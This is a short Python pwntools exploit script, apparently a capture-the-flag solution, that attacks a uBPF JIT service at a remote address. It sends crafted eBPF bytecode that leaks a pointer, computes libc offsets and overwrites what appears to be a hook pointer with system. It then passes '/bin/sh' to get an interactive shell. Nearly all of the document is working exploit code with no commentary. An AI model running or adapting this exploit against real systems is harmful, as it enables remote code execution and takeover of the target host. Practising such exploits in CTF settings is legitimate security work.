import ubpf.assembler
from pwn import *
context.log_level = "debug"
#sh = process(['jit'])
sh = remote('1.13.101.243', 28255)

program = '''
ldxdw %r0, [%r1+0x58]
sub %r0, 0x61bd0
mov %r2, %r0
add %r2, 0x52290
mov %r3, %r0
add %r3, 0x1eee48
stxdw [%r3], %r2
exit
'''

program = ubpf.assembler.assemble(program).encode('hex')

sh.sendlineafter("Program: ", program)

# gdb.attach(sh, '''
# b *$rebase(0x2947)
# c
# si
# ''')
sh.sendlineafter("Memory: ", "/bin/sh".encode('hex'))



sh.interactive()
